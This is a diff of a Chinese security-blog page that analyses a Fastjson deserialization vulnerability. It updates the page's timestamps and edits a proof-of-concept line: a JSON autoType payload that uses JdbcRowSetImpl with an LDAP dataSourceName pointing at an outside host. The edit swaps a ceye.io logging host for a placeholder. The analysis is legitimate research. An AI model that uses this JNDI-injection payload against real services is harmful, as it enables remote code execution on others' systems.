@@ -51,7 +51,7 @@
 <meta property="og:image" content="https://f19t.github.io.git/2023/07/19/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD1/16897713484139.jpg">
 <meta property="og:image" content="https://f19t.github.io.git/2023/07/19/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD1/16897713992352.jpg">
 <meta property="article:published_time" content="2023-07-19T13:19:59.000Z">
-<meta property="article:modified_time" content="2023-07-19T13:23:09.668Z">
+<meta property="article:modified_time" content="2023-09-25T07:18:02.669Z">
 <meta property="article:author" content="f19t">
 <meta property="article:tag" content="JAVASEC">
 <meta property="article:tag" content="fastjson">
@@ -236,10 +236,16 @@
                 <i class="far fa-calendar"></i>
               </span>
               <span class="post-meta-item-text">发表于</span>
-              
 
-              <time title="创建时间：2023-07-19 21:19:59 / 修改时间：21:23:09" itemprop="dateCreated datePublished" datetime="2023-07-19T21:19:59+08:00">2023-07-19</time>
+              <time title="创建时间：2023-07-19 21:19:59" itemprop="dateCreated datePublished" datetime="2023-07-19T21:19:59+08:00">2023-07-19</time>
             </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2023-09-25 15:18:02" itemprop="dateModified" datetime="2023-09-25T15:18:02+08:00">2023-09-25</time>
+              </span>
             <span class="post-meta-item">
               <span class="post-meta-item-icon">
                 <i class="far fa-folder"></i>
@@ -299,7 +305,7 @@
 <p><img src="/2023/07/19/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD1/16897661837460.jpg"></p>
 <p>如果没有生成clazz那么就会报错退出<br><img src="/2023/07/19/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD1/16897690084228.jpg"></p>
 <h4 id="出网POC"><a href="#出网POC" class="headerlink" title="出网POC"></a>出网POC</h4><p>先看poc</p>
-<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot; &#125;,&#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;: \&quot;ldap://1.2.24.map.pxe5l5.ceye.io/Object\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(s2);</span><br></pre></td></tr></table></figure>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">s2</span> <span class="operator">=</span> <span class="string">&quot;&#123;&#123;\&quot;@type\&quot;: \&quot;java.lang.Class\&quot;,\&quot;val\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot; &#125;,&#123;\&quot;@type\&quot;: \&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;: \&quot;ldap://1.2.24.map.xxx.io/Object\&quot;, \&quot;autoCommit\&quot;: true&#125;&#125;&quot;</span>;</span><br><span class="line">JSON.parseObject(s2);</span><br></pre></td></tr></table></figure>
 
 <h5 id="第一个json对象"><a href="#第一个json对象" class="headerlink" title="第一个json对象"></a>第一个json对象</h5><p>json字符串里面有两个json对象。第一个json对象首先获取到clazz&#x3D;java.lang.Class。</p>
 <p><img src="/2023/07/19/Fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E7%BB%AD1/16897701267358.jpg"></p>
